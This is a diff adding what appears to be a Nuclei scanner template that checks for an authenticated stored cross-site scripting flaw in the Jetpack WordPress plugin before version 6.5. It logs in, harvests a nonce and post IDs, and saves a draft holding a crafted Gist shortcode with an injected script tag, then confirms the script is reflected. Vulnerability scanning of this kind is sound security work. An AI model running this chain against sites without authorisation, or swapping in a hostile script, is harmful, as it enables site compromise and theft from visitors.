@@ -1,0 +1,107 @@
+id: jetpack-stored-xss
+
+info:
+  name: Jetpack < 6.5 - Stored Cross-Site Scripting
+  author: 0x_Akoko
+  severity: medium
+  description: |
+    Detected authenticated stored XSS in Jetpack < 6.5 via crafted Gist shortcode.
+  reference:
+    - https://wpscan.com/vulnerability/5e63453f-4d95-4bc3-9338-2d77f95f9ee7/
+    - https://wordpress.org/plugins/jetpack/
+  metadata:
+    verified: true
+    max-request: 4
+  tags: wordpress,wp-plugin,wpscan,jetpack,xss,authenticated,intrusive
+
+flow: http(1) && http(2) && http(3) && http(4)
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 302
+          - contains(header, 'wordpress_logged_in')
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /wp-admin/post-new.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, 'Add New Post')
+        condition: and
+        internal: true
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        name: nonce
+        regex:
+          - 'name="_wpnonce"[^>]+value="([^"]+)"'
+        internal: true
+
+      - type: regex
+        part: body
+        group: 1
+        name: user_id
+        regex:
+          - 'id="user-id"[^>]+value="([^"]+)"'
+        internal: true
+
+      - type: regex
+        part: body
+        group: 1
+        name: post_id
+        regex:
+          - 'id=.post_ID.[^>]+value=.([0-9]+)'
+        internal: true
+
+      - type: regex
+        part: body
+        group: 1
+        name: referer
+        regex:
+          - 'name="_wp_http_referer"[^>]+value="([^"]+)"'
+        internal: true
+
+  - raw:
+      - |
+        POST /wp-admin/post.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _wpnonce={{nonce}}&_wp_http_referer={{referer}}&user_ID={{user_id}}&action=editpost&originalaction=editpost&post_author={{user_id}}&post_type=post&original_post_status=auto-draft&referredby=&_wp_original_http_referer=&auto_draft=1&post_ID={{post_id}}&post_title=XSS+Test&content=[gist]"></script><script>alert(document.domain)</script><script src="[/gist]&post_status=draft&hidden_post_status=draft&visibility=public&hidden_post_visibility=public&mm=12&jj=26&aa=2025&hh=04&mn=18&ss=00&hidden_mm=12&hidden_jj=26&hidden_aa=2025&hidden_hh=04&hidden_mn=18&save=Save+Draft
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 302
+        internal: true
+
+  - raw:
+      - |
+        GET /wp-admin/post.php?post={{post_id}}&action=edit HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, 'alert(document.domain)')
+        condition: and
+# digest: 490a0046304402204b9ec1566057d55e4b505d6a06d0063fbe176410198e53ea87fc57a6a6ba780b02204023d3e231c9c3268a19c071438977f28eed0beebe97b838aa8abad06193ad2c:922c64590222798bb761d5b6d8e72950
